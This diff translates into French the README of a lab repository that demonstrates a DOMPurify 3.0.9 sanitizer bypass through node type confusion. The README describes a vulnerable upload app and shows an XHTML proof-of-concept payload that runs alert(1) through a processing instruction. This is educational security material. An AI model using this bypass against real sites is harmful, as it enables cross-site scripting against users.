@@ -1,8 +1,10 @@
 # Dompurify 3.0.9 bypass - Node type confusion
 
-__Read this in other languages:__ [English](README.md), [Français](README.fr.md)
+## Lien vers l'article complet
 
-Link to the full article (in french) : https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion
+> Un article reprenant le travail de slonser concernant le bypass de Dompurify dans sa version 3.0.9.
+
+[https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion](https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion)
 
 ## Installation
 
@@ -15,17 +17,17 @@ docker run -p 3000:3000 dompurify-3.0.9-bypass
 
 ## Description
 
-The application allows uploading files in HTML, SVG, or XHTML format, but accessing these files, although possible, is restricted by a CSP policy. However, including such a file, sanitized by Dompurify, within the main page, enables bypass exploitation and execution of JavaScript code.
+L'application permet de téléverser des fichiers au format HTML, SVG ou XHTML, mais la consultation de ces fichiers, bien que possible, est restreinte par une politique CSP. L'inclusion d'un tel fichier, assainie par Dompurify, au sein de la page principale, permet toutefois l'exploitation du bypass et l'exécution de code Javascript.
 
 ## Exploitation
 
-### HTML file
+### Fichier HTML
 
-The vulnerability is exploitable only when the node is of XML type. Including an HTML file confirms the proper sanitization by Dompurify when the node is of HTML type.
+La vulnérabilité est exploitable seulement lorsque le noeud est de type XML. L'inclusion d'un fichier HTML permet de confirmer le bon assainissement de la part de Dompurify lorsque le noeud est de type HTML.
 
-### SVG file
+### Fichier SVG
 
-The following SVG file allows bypass exploitation:
+Le fichier SVG suivant permet l'exploitation du bypass :
 ```
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
@@ -34,9 +36,9 @@ The following SVG file allows bypass exploitation:
 </svg>
 ```
 
-### XHTML file
+### Fichier XHTML
 
-The following XHTML file allows bypass exploitation:
+Le fichier XHTML suivant permet l'exploitation du bypass :
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
@@ -46,7 +48,7 @@ The following XHTML file allows bypass exploitation:
 </head>
 <body>
     <h1>Document XHTML</h1>
-    <p>Exploitation of Dompurify 3.0.9.</p>
+    <p>Exploitation de Dompurify 3.0.9.</p>
     <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
 </body>
 </html>
